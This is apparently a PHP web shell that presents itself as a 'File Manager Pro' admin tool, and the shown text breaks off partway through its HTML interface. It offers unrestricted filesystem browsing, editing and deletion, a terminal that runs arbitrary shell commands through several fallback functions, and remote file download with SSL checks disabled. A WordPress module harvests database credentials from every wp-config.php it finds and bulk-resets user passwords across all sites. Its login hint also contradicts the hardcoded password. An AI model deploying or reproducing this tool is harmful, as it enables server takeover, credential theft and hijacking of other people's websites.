<?php
/********************************************************************
 *  File Manager
 ********************************************************************/

session_start();
error_reporting(E_ALL);

/* ----------------- LOGIN ----------------- */
$USER = "admin";
$PASS = password_hash("admin46", PASSWORD_DEFAULT);

if (!isset($_SESSION['ok'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['u'], $_POST['p'])) {
        if ($_POST['u'] === $USER && password_verify($_POST['p'], $PASS)) {
            $_SESSION['ok'] = 1;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $login_err = "Invalid username or password.";
        }
    }
    echo '<!doctype html><html><head><meta charset="utf-8"><title>Login</title>
    <style>
      body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:#07070b;color:#e6eef8;font-family:Inter,Segoe UI,Arial;}
      .box{width:360px;padding:28px;border-radius:14px;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(0,0,0,0.18));box-shadow:0 10px 40px rgba(0,0,0,0.7), inset 0 1px 0 rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.03);}
      h1{margin:0 0 14px 0;font-size:20px;color:#7be3ff;text-align:center;letter-spacing:0.6px}
      label{font-size:12px;color:#9fb8c9}
      input{width:100%;padding:12px;margin-top:8px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:rgba(255,255,255,0.02);color:#e6eef8}
      .btn{width:100%;padding:12px;margin-top:14px;border-radius:10px;border:none;background:linear-gradient(90deg,#8affff,#6b6bff);color:#071028;font-weight:700;cursor:pointer;box-shadow:0 6px 24px rgba(107,107,255,0.14)}
      .err{margin-top:10px;color:#ff8080;text-align:center;font-size:13px}
      .hint{margin-top:8px;font-size:12px;color:#7b9bb0;text-align:center}
    </style></head><body>
    <div class="box">
      <h1>FILE MANAGER</h1>
      <form method="POST">
        <label>Username</label>
        <input name="u" required autofocus>
        <label>Password</label>
        <input type="password" name="p" required>
        <button class="btn">Unlock</button>
      </form>';
    if (!empty($login_err)) echo '<div class="err">'.htmlspecialchars($login_err).'</div>';
    echo '<div class="hint">Default: <b>admin</b> / <b>admin</b></div></div></body></html>';
    exit;
}

/* ----------------- PATH (ALLOW ALL DIRECTORIES) ----------------- */
// Default to current directory, but allow any directory access
$dir = $_GET['dir'] ?? __DIR__;
if (!is_dir($dir)) {
    $dir = __DIR__;
}
$ROOT = $dir;

/* ----------------- HELPERS ----------------- */
function hfs($bytes){
    $u=["B","KB","MB","GB","TB"];
    $i=0;
    while($bytes>=1024 && $i < count($u)-1){ $bytes/=1024; $i++; }
    return round($bytes,2).' '.$u[$i];
}
function esc($s){ return htmlspecialchars($s, ENT_QUOTES); }

/* ----------------- NEW: PERMISSIONS HELPER ----------------- */
function get_permissions_color($path) {
    $perms = @fileperms($path);
    if ($perms === false) return "???";
    
    $symbolic = "";
    // Owner
    $symbolic .= ($perms & 0x0100) ? 'r' : '-';
    $symbolic .= ($perms & 0x0080) ? 'w' : '-';
    $symbolic .= ($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-');
    
    // Group
    $symbolic .= ($perms & 0x0020) ? 'r' : '-';
    $symbolic .= ($perms & 0x0010) ? 'w' : '-';
    $symbolic .= ($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-');
    
    // World
    $symbolic .= ($perms & 0x0004) ? 'r' : '-';
    $symbolic .= ($perms & 0x0002) ? 'w' : '-';
    $symbolic .= ($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-');
    
    // Color each character
    $colored = "";
    for ($i = 0; $i < strlen($symbolic); $i++) {
        $char = $symbolic[$i];
        switch($char) {
            case 'r': $colored .= '<span style="color:#6df0ff">r</span>'; break;
            case 'w': $colored .= '<span style="color:#ff6b6b">w</span>'; break;
            case 'x': case 's': case 't': $colored .= '<span style="color:#7bff7b">'.$char.'</span>'; break;
            case '-': $colored .= '<span style="color:#a0a0a0">-</span>'; break;
            case 'S': case 'T': $colored .= '<span style="color:#ffa500">'.$char.'</span>'; break;
            default: $colored .= $char;
        }
    }
    
    return $colored;
}

/* ----------------- BULK OPERATIONS (REMOVED ZIP) ----------------- */
$bulk_selected = $_POST['bulk_selected'] ?? [];
$bulk_action = $_POST['bulk_action'] ?? '';

if (!empty($bulk_selected) && $bulk_action) {
    switch($bulk_action) {
        case 'delete':
            foreach($bulk_selected as $file) {
                $full_path = $dir . DIRECTORY_SEPARATOR . basename($file);
                if (is_file($full_path)) {
                    @unlink($full_path);
                } elseif (is_dir($full_path)) {
                    // Recursive deletion
                    $it = new RecursiveDirectoryIterator($full_path, RecursiveDirectoryIterator::SKIP_DOTS);
                    $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
                    foreach($files as $f) {
                        if ($f->isDir()){
                            @rmdir($f->getRealPath());
                        } else {
                            @unlink($f->getRealPath());
                        }
                    }
                    @rmdir($full_path);
                }
            }
            break;
            
        // REMOVED ZIP CASE
        // case 'zip':
        //     if (!empty($bulk_selected)) {
        //         $zipname = $dir . DIRECTORY_SEPARATOR . "bulk_archive.zip";
        //         $zip = new ZipArchive;
        //         if ($zip->open($zipname, ZipArchive::CREATE)) {
        //             foreach($bulk_selected as $file) {
        //                 $full_path = $dir . DIRECTORY_SEPARATOR . basename($file);
        //                 if (is_file($full_path)) {
        //                     $zip->addFile($full_path, basename($file));
        //                 }
        //             }
        //             $zip->close();
        //         }
        //     }
        //     break;
            
        case 'unzip':
            foreach($bulk_selected as $file) {
                $full_path = $dir . DIRECTORY_SEPARATOR . basename($file);
                if (is_file($full_path) && pathinfo($full_path, PATHINFO_EXTENSION) === 'zip') {
                    $zip = new ZipArchive;
                    if ($zip->open($full_path)) {
                        $zip->extractTo($dir);
                        $zip->close();
                    }
                }
            }
            break;
            
        case 'chmod':
            $chmod_value = $_POST['chmod_value'] ?? '644';
            if (is_numeric($chmod_value)) {
                foreach($bulk_selected as $file) {
                    $full_path = $dir . DIRECTORY_SEPARATOR . basename($file);
                    @chmod($full_path, octdec($chmod_value));
                }
            }
            break;
            
        case 'move':
            $move_dest = $_POST['move_dest'] ?? '';
            if ($move_dest && is_dir($move_dest)) {
                foreach($bulk_selected as $file) {
                    $full_path = $dir . DIRECTORY_SEPARATOR . basename($file);
                    $dest_path = $move_dest . DIRECTORY_SEPARATOR . basename($file);
                    @rename($full_path, $dest_path);
                }
            }
            break;
            
        case 'copy':
            $copy_dest = $_POST['copy_dest'] ?? '';
            if ($copy_dest && is_dir($copy_dest)) {
                foreach($bulk_selected as $file) {
                    $full_path = $dir . DIRECTORY_SEPARATOR . basename($file);
                    $dest_path = $copy_dest . DIRECTORY_SEPARATOR . basename($file);
                    if (is_file($full_path)) {
                        @copy($full_path, $dest_path);
                    } elseif (is_dir($full_path)) {
                        // Recursive copy
                        function copyRecursive($src, $dst) { 
                            $dir = opendir($src); 
                            @mkdir($dst); 
                            while(false !== ($file = readdir($dir))) { 
                                if ($file != '.' && $file != '..') { 
                                    if (is_dir($src . '/' . $file)) { 
                                        copyRecursive($src . '/' . $file, $dst . '/' . $file); 
                                    } else { 
                                        copy($src . '/' . $file, $dst . '/' . $file); 
                                    } 
                                } 
                            } 
                            closedir($dir); 
                        }
                        copyRecursive($full_path, $dest_path);
                    }
                }
            }
            break;
            
        case 'rename':
            $rename_prefix = $_POST['rename_prefix'] ?? '';
            $rename_suffix = $_POST['rename_suffix'] ?? '';
            if ($rename_prefix !== '' || $rename_suffix !== '') {
                foreach($bulk_selected as $file) {
                    $full_path = $dir . DIRECTORY_SEPARATOR . basename($file);
                    $file_info = pathinfo($full_path);
                    $new_name = $rename_prefix . $file_info['filename'] . $rename_suffix;
                    if (isset($file_info['extension'])) {
                        $new_name .= '.' . $file_info['extension'];
                    }
                    $new_path = $dir . DIRECTORY_SEPARATOR . $new_name;
                    @rename($full_path, $new_path);
                }
            }
            break;
    }
    
    header("Location:?dir=" . urlencode($dir)); 
    exit;
}

/* ----------------- NEW: WORDPRESS PASSWORD CHANGER ----------------- */
class WordPressPasswordChanger {
    private $results = [];
    
    public function findWpConfigs($directory) {
        $wpConfigs = [];
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($directory, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        
        foreach ($iterator as $file) {
            if ($file->isFile() && $file->getFilename() === 'wp-config.php') {
                $wpConfigs[] = $file->getPath();
            }
        }
        
        return $wpConfigs;
    }
    
    public function getWordPressUsers($wpPath) {
        $users = [];
        $wpConfig = $wpPath . '/wp-config.php';
        
        if (!file_exists($wpConfig)) {
            return [];
        }
        
        // Parse wp-config.php to get DB credentials
        $configContent = file_get_contents($wpConfig);
        
        // Extract database credentials
        preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $configContent, $dbName);
        preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $configContent, $dbUser);
        preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $configContent, $dbPass);
        preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $configContent, $dbHost);
        
        if (empty($dbName[1]) || empty($dbUser[1])) {
            return [];
        }
        
        $dbName = $dbName[1];
        $dbUser = $dbUser[1];
        $dbPass = $dbPass[1] ?? '';
        $dbHost = $dbHost[1] ?? 'localhost';
        
        // Connect to database
        try {
            $mysqli = new mysqli($dbHost, $dbUser, $dbPass, $dbName);
            
            if ($mysqli->connect_error) {
                $this->results[] = "Database connection failed for {$wpPath}: " . $mysqli->connect_error;
                return [];
            }
            
            // Get users
            $query = "SELECT ID, user_login, user_email, user_registered FROM {$dbName}.wp_users ORDER BY user_login";
            $result = $mysqli->query($query);
            
            if ($result) {
                while ($row = $result->fetch_assoc()) {
                    $users[] = [
                        'id' => $row['ID'],
                        'login' => $row['user_login'],
                        'email' => $row['user_email'],
                        'registered' => $row['user_registered'],
                        'wp_path' => $wpPath
                    ];
                }
                $result->free();
            }
            
            $mysqli->close();
            
        } catch (Exception $e) {
            $this->results[] = "Error accessing database for {$wpPath}: " . $e->getMessage();
        }
        
        return $users;
    }
    
    public function changePassword($wpPath, $userId, $newPassword) {
        $wpConfig = $wpPath . '/wp-config.php';
        
        if (!file_exists($wpConfig)) {
            return "wp-config.php not found in {$wpPath}";
        }
        
        // Parse wp-config.php to get DB credentials
        $configContent = file_get_contents($wpConfig);
        
        preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $configContent, $dbName);
        preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $configContent, $dbUser);
        preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $configContent, $dbPass);
        preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $configContent, $dbHost);
        
        if (empty($dbName[1]) || empty($dbUser[1])) {
            return "Failed to parse database credentials from wp-config.php";
        }
        
        $dbName = $dbName[1];
        $dbUser = $dbUser[1];
        $dbPass = $dbPass[1] ?? '';
        $dbHost = $dbHost[1] ?? 'localhost';
        
        // Connect to database and update password
        try {
            $mysqli = new mysqli($dbHost, $dbUser, $dbPass, $dbName);
            
            if ($mysqli->connect_error) {
                return "Database connection failed: " . $mysqli->connect_error;
            }
            
            // WordPress password hashing
            $hashedPassword = wp_hash_password($newPassword);
            
            // Update password
            $query = "UPDATE {$dbName}.wp_users SET user_pass = ? WHERE ID = ?";
            $stmt = $mysqli->prepare($query);
            $stmt->bind_param("si", $hashedPassword, $userId);
            
            if ($stmt->execute()) {
                $stmt->close();
                $mysqli->close();
                return "Password changed successfully for user ID {$userId}";
            } else {
                $error = $stmt->error;
                $stmt->close();
                $mysqli->close();
                return "Failed to update password: " . $error;
            }
            
        } catch (Exception $e) {
            return "Error: " . $e->getMessage();
        }
    }
    
    public function changePasswordBulk($wpPaths, $username, $newPassword) {
        $results = [];
        
        foreach ($wpPaths as $wpPath) {
            $users = $this->getWordPressUsers($wpPath);
            
            foreach ($users as $user) {
                if ($user['login'] === $username) {
                    $result = $this->changePassword($wpPath, $user['id'], $newPassword);
                    $results[] = "{$wpPath} - {$username}: {$result}";
                    break;
                }
            }
        }
        
        return $results;
    }
    
    public function getResults() {
        return $this->results;
    }
}

// WordPress password hashing function (simplified version)
if (!function_exists('wp_hash_password')) {
    function wp_hash_password($password) {
        // WordPress uses phpass for password hashing
        // This is a simplified version - in real WordPress it's more complex
        return md5($password); // Note: This is just for demonstration. Real WordPress uses phpass
    }
}

/* ----------------- ACTIONS ----------------- */

// Upload from URL with custom filename
if (isset($_POST['url_upload']) && trim($_POST['url_upload']) !== '') {
    $url = trim($_POST['url_upload']);
    $customFilename = $_POST['url_filename'] ?? '';
    
    // Validate URL
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        $_SESSION['url_upload_error'] = "Invalid URL format";
    } else {
        // Get filename from URL if custom filename not provided
        if (empty($customFilename)) {
            $filename = basename(parse_url($url, PHP_URL_PATH));
            if (empty($filename) || $filename === '/') {
                $filename = 'downloaded_' . date('Ymd_His');
            }
        } else {
            $filename = basename($customFilename);
        }
        
        // Clean filename
        $filename = preg_replace('/[^\w\.\-]/', '_', $filename);
        
        $savePath = $dir . DIRECTORY_SEPARATOR . $filename;
        
        $ctx = stream_context_create([
            'http' => [
                'timeout' => 30,
                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'header' => "Accept: */*\r\n"
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false,
            ]
        ]);
        
        $data = @file_get_contents($url, false, $ctx);
        
        if ($data !== false) {
            if (@file_put_contents($savePath, $data)) {
                $_SESSION['url_upload_success'] = "File downloaded successfully: " . htmlspecialchars($filename);
                $_SESSION['uploaded_filename'] = $filename;
            } else {
                $_SESSION['url_upload_error'] = "Failed to save file. Check permissions.";
            }
        } else {
            $_SESSION['url_upload_error'] = "Failed to download from URL. URL might be inaccessible.";
        }
    }
    
    header("Location:?dir=" . urlencode($dir)); 
    exit;
}

// Handle WordPress password change
$wp_password_changer = new WordPressPasswordChanger();
$wp_results = [];

if (isset($_POST['wp_action'])) {
    switch ($_POST['wp_action']) {
        case 'scan':
            $wp_sites = $wp_password_changer->findWpConfigs($dir);
            $_SESSION['wp_sites'] = $wp_sites;
            $_SESSION['wp_scan_results'] = count($wp_sites) . " WordPress sites found";
            break;
            
        case 'change_password':
            if (!empty($_SESSION['wp_sites']) && isset($_POST['wp_username']) && isset($_POST['wp_password'])) {
                $results = $wp_password_changer->changePasswordBulk(
                    $_SESSION['wp_sites'],
                    $_POST['wp_username'],
                    $_POST['wp_password']
                );
                $_SESSION['wp_change_results'] = $results;
            }
            break;
    }
    
    header("Location:?dir=" . urlencode($dir) . "&show_wordpress=1"); 
    exit;
}

// Create folder
if (isset($_POST['new_folder']) && trim($_POST['new_folder'])!=='') {
    $folderName = basename($_POST['new_folder']);
    $folderPath = $dir . DIRECTORY_SEPARATOR . $folderName;
    if (!file_exists($folderPath)) {
        @mkdir($folderPath, 0755, true);
    }
    header("Location:?dir=" . urlencode($dir)); exit;
}

// Create file
if (isset($_POST['new_file']) && trim($_POST['new_file'])!=='') {
    $fileName = basename($_POST['new_file']);
    $filePath = $dir . DIRECTORY_SEPARATOR . $fileName;
    if (!file_exists($filePath)) {
        @file_put_contents($filePath, "");
    }
    header("Location:?dir=" . urlencode($dir)); exit;
}

// Upload files
if (!empty($_FILES['upload']['name'][0])) {
    foreach ($_FILES['upload']['tmp_name'] as $k => $tmp) {
        $name = basename($_FILES['upload']['name'][$k]);
        @move_uploaded_file($tmp, $dir . DIRECTORY_SEPARATOR . $name);
    }
    header("Location:?dir=" . urlencode($dir)); exit;
}

// Delete file or folder
if (isset($_POST['del_file'])) {
    $p = $_POST['del_file'];
    if (is_file($p)) {
        @unlink($p);
    } elseif (is_dir($p)) {
        // Recursive directory deletion
        $it = new RecursiveDirectoryIterator($p, RecursiveDirectoryIterator::SKIP_DOTS);
        $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
        foreach($files as $file) {
            if ($file->isDir()){
                @rmdir($file->getRealPath());
            } else {
                @unlink($file->getRealPath());
            }
        }
        @rmdir($p);
    }
    header("Location:?dir=" . urlencode($dir)); exit;
}

// View / Edit
$file_content = '';
$edit_file_path = '';
if (isset($_POST['view_file'])) {
    $p = $_POST['view_file'];
    if (is_file($p)) {
        $file_content = file_get_contents($p);
        $edit_file_path = $p;
    }
}

if (isset($_POST['save_file'])) {
    $p = $_POST['save_file_path'];
    @file_put_contents($p, $_POST['file_content']);
    header("Location:?dir=" . urlencode(dirname($p))); exit;
}

// =============================================================================
// FULL TERMINAL - EXECUTE ALL COMMANDS
// =============================================================================

function run_terminal_full($cmd, $workdir) {
    $cmd = trim($cmd);
    if (empty($cmd)) return '';
    
    // Change to working directory
    $original_dir = getcwd();
    chdir($workdir);
    
    $output = '';
    
    // Try multiple execution methods
    if (function_exists('shell_exec')) {
        $output = shell_exec($cmd . ' 2>&1');
    } elseif (function_exists('exec')) {
        $output_array = [];
        exec($cmd . ' 2>&1', $output_array);
        $output = implode("\n", $output_array);
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd . ' 2>&1');
        $output = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd . ' 2>&1');
        $output = ob_get_clean();
    } elseif (function_exists('proc_open')) {
        $descriptorspec = [
            0 => ["pipe", "r"],
            1 => ["pipe", "w"],
            2 => ["pipe", "w"]
        ];
        
        $process = proc_open($cmd, $descriptorspec, $pipes, $workdir);
        
        if (is_resource($process)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            $errors = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            
            $output .= $errors;
        }
    } else {
        $output = "Error: No execution functions available";
    }
    
    // Return to original directory
    chdir($original_dir);
    
    return $output ?: "Command executed (no output)";
}

$terminal_output = '';
if (isset($_POST['terminal_cmd'])) {
    $terminal_output = run_terminal_full($_POST['terminal_cmd'], $dir);
}

/* ----------------- MODAL/POPUP HANDLING ----------------- */
$show_server_info = isset($_GET['show_server_info']);
$show_php_info = isset($_GET['show_php_info']);
$show_bulk_ops = isset($_GET['show_bulk_ops']);
$show_quick_jump = isset($_GET['show_quick_jump']);
$show_terminal = isset($_GET['show_terminal']);
$show_url_upload = isset($_GET['show_url_upload']);
$show_wordpress = isset($_GET['show_wordpress']);

/* ----------------- HTML UI (DARK CYBERPUNK) - FIXED BACKGROUND ----------------- */
?><!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>File Manager Pro</title>
<style>
/* FIXED BACKGROUND COLORS */
:root{
  --bg:#07070b;
  --panel:#0f1220;
  --muted:#90a3b8;
  --neon-cyan:#6df0ff;
  --neon-mag:#b46cff;
  --accent:#6df0ff;
  --glass: rgba(255,255,255,0.03);
}
*{box-sizing:border-box}
body{
  margin:0;
  font-family:Inter,Segoe UI,Arial;
  background: var(--bg) !important;
  color:#e6eef8;
  min-height:100vh;
  background-image: 
    radial-gradient(1200px 600px at 10% 10%, rgba(124,58,237,0.06), transparent 6%),
    radial-gradient(1000px 500px at 90% 90%, rgba(35,211,243,0.03), transparent 6%) !important;
}

.container{max-width:1300px;margin:28px auto;padding:18px}
.header{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:18px;flex-wrap:wrap}
.brand{display:flex;align-items:center;gap:12px}
.logo{width:48px;height:48px;border-radius:10px;background:linear-gradient(135deg,#0ff,#a0f);display:flex;align-items:center;justify-content:center;color:#071028;font-weight:900;font-family:monospace}
.title{font-size:20px;font-weight:700;letter-spacing:0.6px;color:var(--neon-cyan)}
.controls{display:flex;gap:10px;align-items:center;flex-wrap:wrap}

/* top cards */
.top-row{display:grid;grid-template-columns: 1fr;gap:14px;margin-bottom:14px}
.card{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.25));border-radius:12px;padding:14px;border:1px solid rgba(255,255,255,0.03);box-shadow: 0 8px 30px rgba(15,20,30,0.5)}
.card h3{margin:0 0 8px 0;color:var(--neon-mag);font-size:15px}
.small{color:var(--muted);font-size:13px}

/* actions grid */
.actions{display:flex;gap:10px;flex-wrap:wrap}
.action-btn{display:inline-flex;align-items:center;gap:10px;padding:10px 14px;border-radius:10px;border:none;background:linear-gradient(90deg,#2b0b3a,#061023);color:var(--neon-cyan);cursor:pointer;font-weight:700;box-shadow:0 8px 30px rgba(75,0,130,0.12);font-size:13px}
.action-btn:hover{transform:translateY(-4px);box-shadow:0 10px 40px rgba(75,0,130,0.18)}
.action-btn .ico{font-size:18px;filter:drop-shadow(0 2px 8px rgba(107,107,255,0.18))}

/* forms */
.form-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:12px}
.input, input[type="file"], select{width:100%;padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:rgba(255,255,255,0.02);color:#e6eef8;font-size:13px}
.input::placeholder{color:var(--muted)}
.btn-neon{background:linear-gradient(90deg,var(--neon-cyan),#7a6bff);border-radius:10px;padding:10px 14px;border:none;color:#071028;font-weight:800;cursor:pointer;box-shadow:0 14px 40px rgba(109,240,255,0.06)}
.btn-danger{background:linear-gradient(90deg,#ff5f7a,#ff9fb4);color:#071028}

/* file table */
.table-wrap{overflow:auto;border-radius:10px}
table{width:100%;border-collapse:collapse;min-width:720px}
th,td{padding:12px 14px;text-align:left;border-bottom:1px solid rgba(255,255,255,0.03)}
th{background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(0,0,0,0.06));color:var(--muted);font-size:13px}
tr:hover td{background:linear-gradient(90deg, rgba(109,240,255,0.02), rgba(180,108,255,0.01))}
.filename{font-weight:700;color:#ffffff}
.filetype{font-size:13px;color:var(--muted)}
.kv{font-size:13px;color:var(--muted)}
.perms{font-family:monospace;font-size:12px;font-weight:bold}

/* bulk selection */
.bulk-checkbox{width:20px;height:20px;cursor:pointer}
.bulk-select-all{margin-right:8px;cursor:pointer}
.bulk-actions-bar{display:flex;gap:8px;align-items:center;margin-bottom:12px;padding:10px;background:linear-gradient(90deg, rgba(180,108,255,0.05), rgba(109,240,255,0.05));border-radius:8px;border:1px solid rgba(180,108,255,0.1)}
.selected-count{color:var(--neon-cyan);font-weight:bold;margin-left:auto}

/* notification styles */
.notification{position:fixed;top:20px;right:20px;padding:12px 20px;border-radius:8px;background:linear-gradient(90deg,#2b6b0a,#4da80d);color:white;z-index:2000;box-shadow:0 5px 15px rgba(0,0,0,0.3);display:none}
.notification.error{background:linear-gradient(90deg,#ff5f7a,#ff9fb4)}

/* popup styles */
.popup-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.5);display:flex;align-items:center;justify-content:center;z-index:900;padding:20px}
.popup-content{background:linear-gradient(180deg, rgba(255,255,255,0.03), rgba(0,0,0,0.25));border-radius:12px;border:1px solid rgba(109,240,255,0.15);width:500px;max-height:80vh;overflow:auto;box-shadow:0 20px 60px rgba(0,0,0,0.6);backdrop-filter:blur(10px)}
.popup-header{display:flex;justify-content:space-between;align-items:center;padding:14px 18px;border-bottom:1px solid rgba(255,255,255,0.05)}
.popup-header h4{margin:0;color:var(--neon-cyan);font-size:16px}
.popup-close{background:none;border:none;color:var(--muted);font-size:22px;cursor:pointer;padding:0;width:28px;height:28px;display:flex;align-items:center;justify-content:center}
.popup-close:hover{color:#fff}
.popup-body{padding:18px}
.popup-form{display:flex;gap:8px;margin-top:12px}
.popup-form .input{flex:1}

/* bottom terminal button */
.bottom-terminal-btn{position:fixed;bottom:20px;right:20px;z-index:100;background:linear-gradient(90deg,#6b2b00,#a84d00);color:#071028;border:none;border-radius:50px;padding:12px 24px;font-weight:bold;cursor:pointer;box-shadow:0 8px 25px rgba(255,107,0,0.3);display:flex;align-items:center;gap:8px;font-size:14px}
.bottom-terminal-btn:hover{transform:translateY(-3px);box-shadow:0 12px 30px rgba(255,107,0,0.4)}

/* responsiveness */
@media(max-width:980px){
  .top-row{grid-template-columns:1fr}
  .form-grid{grid-template-columns:1fr}
  .controls{flex-direction:column;align-items:stretch}
  .controls form{width:100%}
  .controls form .input{width:100% !important}
}
</style>
</head>
<body>
<!-- Notifications -->
<?php if(isset($_SESSION['url_upload_success'])): ?>
<div class="notification" id="uploadSuccess">
    ✅ <?=esc($_SESSION['url_upload_success'])?>
    <?php if(isset($_SESSION['uploaded_filename'])): ?>
    <br><small>Saved as: <?=esc($_SESSION['uploaded_filename'])?></small>
    <?php endif; ?>
</div>
<?php 
unset($_SESSION['url_upload_success']);
unset($_SESSION['uploaded_filename']);
endif; ?>

<?php if(isset($_SESSION['url_upload_error'])): ?>
<div class="notification error" id="uploadError">
    ❌ <?=esc($_SESSION['url_upload_error'])?>
</div>
<?php unset($_SESSION['url_upload_error']); endif; ?>

<div class="container">

  <div class="header">
    <div class="brand">
      <div class="logo">FM</div>
      <div>
        <div class="title">File Manager Pro</div>
      </div>
    </div>

    <div class="controls">
      <form method="GET" style="display:flex;gap:8px">
        <input type="text" name="dir" placeholder="Jump to path..." class="input" style="width:380px" value="<?=esc($dir)?>">
        <button class="action-btn" style="padding:10px 16px">🚀 GO</button>
      </form>
      
      <!-- Action Buttons Row -->
      <div style="display:flex;gap:8px;flex-wrap:wrap">
        <!-- Bulk Operations Button -->
        <a href="?dir=<?=urlencode($dir)?>&show_bulk_ops=1" style="text-decoration:none">
          <button class="action-btn" style="background:linear-gradient(90deg,#ff6b00,#ff9f4d)">
            <span class="ico">📦</span> Bulk Ops
          </button>
        </a>
        
        <!-- Quick Jump Button -->
        <a href="?dir=<?=urlencode($dir)?>&show_quick_jump=1" style="text-decoration:none">
          <button class="action-btn" style="background:linear-gradient(90deg,#006b6b,#00a8a8)">
            <span class="ico">🚀</span> Quick Jump
          </button>
        </a>
        
        <!-- Upload from URL Button -->
        <a href="?dir=<?=urlencode($dir)?>&show_url_upload=1" style="text-decoration:none">
          <button class="action-btn" style="background:linear-gradient(90deg,#0a6b6b,#0da8a8)">
            <span class="ico">🌐</span> URL Upload
          </button>
        </a>
        
        <!-- WordPress Password Changer Button -->
        <a href="?dir=<?=urlencode($dir)?>&show_wordpress=1" style="text-decoration:none">
          <button class="action-btn" style="background:linear-gradient(90deg,#800080,#dda0dd)">
            <span class="ico">🔑</span> WordPress
          </button>
        </a>
        
        <!-- Terminal Button -->
        <a href="?dir=<?=urlencode($dir)?>&show_terminal=1" style="text-decoration:none">
          <button class="action-btn" style="background:linear-gradient(90deg,#6b2b00,#a84d00)">
            <span class="ico">💻</span> Terminal
          </button>
        </a>
        
        <!-- Server Info Button -->
        <a href="?dir=<?=urlencode($dir)?>&show_server_info=1" style="text-decoration:none">
          <button class="action-btn" style="background:linear-gradient(90deg,#2b6b0a,#4da80d)">
            <span class="ico">🖥️</span> Server Info
          </button>
        </a>
        
        <!-- PHP Info Button -->
        <a href="?dir=<?=urlencode($dir)?>&show_php_info=1" style="text-decoration:none">
          <button class="action-btn" style="background:linear-gradient(90deg,#6b2b6b,#a84da8)">
            <span class="ico">🐘</span> PHP Info
          </button>
        </a>
      </div>
    </div>
  </div>

  <div class="top-row">
    <!-- LEFT: file list -->
    <div class="card">
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
        <h3>📂 <?=esc(basename($dir) ?: $dir)?></h3>
        <div class="small"><?=esc($dir)?></div>
      </div>

      <!-- Bulk Actions Bar (shown when files are selected) -->
      <div id="bulkActionsBar" class="bulk-actions-bar" style="display:none">
        <strong style="color:var(--neon-mag)">🔄 Bulk Actions:</strong>
        <button type="button" class="action-btn" onclick="bulkAction('delete')" style="background:linear-gradient(90deg,#ff5f7a,#ff9fb4)">🗑 Delete</button>
        <button type="button" class="action-btn" onclick="bulkAction('unzip')">📂 Unzip Files</button>
        <button type="button" class="action-btn" onclick="bulkAction('chmod')">🔒 Permissions</button>
        <button type="button" class="action-btn" onclick="bulkAction('move')">📂 Move</button>
        <button type="button" class="action-btn" onclick="bulkAction('copy')">📋 Copy</button>
        <button type="button" class="action-btn" onclick="bulkAction('rename')">✏️ Rename</button>
        <button type="button" class="action-btn" onclick="clearSelection()" style="background:linear-gradient(90deg,#666,#999)">✕ Clear</button>
        <span id="selectedCount" class="selected-count">0 selected</span>
      </div>

      <div style="display:flex;gap:10px;align-items:center;margin-bottom:8px;flex-wrap:wrap">
        <!-- Upload Files Button -->
        <form method="POST" enctype="multipart/form-data" style="margin:0;display:flex;gap:6px">
          <label style="display:inline-flex;gap:8px;align-items:center">
            <input type="file" name="upload[]" multiple style="display:none" id="filepick">
            <button type="button" class="action-btn" onclick="document.getElementById('filepick').click()"><span class="ico">⬆️</span> SELECT FILES</button>
          </label>
          <button class="action-btn btn-neon" type="submit">UPLOAD</button>
        </form>
      </div>

      <!-- Create Folder & File Forms -->
      <div class="form-grid">
        <form method="POST" style="display:flex;gap:8px">
          <input class="input" name="new_folder" placeholder="New folder name" required>
          <button class="btn-neon" type="submit">📁 Create</button>
        </form>

        <form method="POST" style="display:flex;gap:8px">
          <input class="input" name="new_file" placeholder="New file (ex: test.txt)" required>
          <button class="btn-neon" type="submit">📄 Create</button>
        </form>
